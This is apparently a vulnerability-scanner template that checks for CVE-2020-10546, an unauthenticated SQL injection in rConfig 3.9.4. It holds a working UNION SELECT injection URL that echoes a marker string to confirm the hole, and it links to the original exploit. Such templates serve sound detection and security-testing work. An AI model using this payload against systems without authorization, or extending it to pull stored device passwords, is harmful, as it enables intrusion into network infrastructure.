id: cve-2020-10546
info:
  author: madrobot
  description: rConfig 3.9.4 and previous versions has unauthenticated compliancepolicies.inc.php
    SQL injection. Because, by default, nodes' passwords are stored in cleartext,
    this vulnerability leads to lateral movement, granting an attacker access to monitored
    network devices.
  name: rConfig 3.9.4 SQLi
  reference: '- https://github.com/theguly/exploits/blob/master/CVE-2020-10546.py

    - https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/

    '
  severity: high
  tags: cve,cve2020,rconfig,sqli
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - '[project-discovery]'
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/compliancepolicies.inc.php?search=True&searchColumn=policyName&searchOption=contains&searchField=antani''+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL+--+'
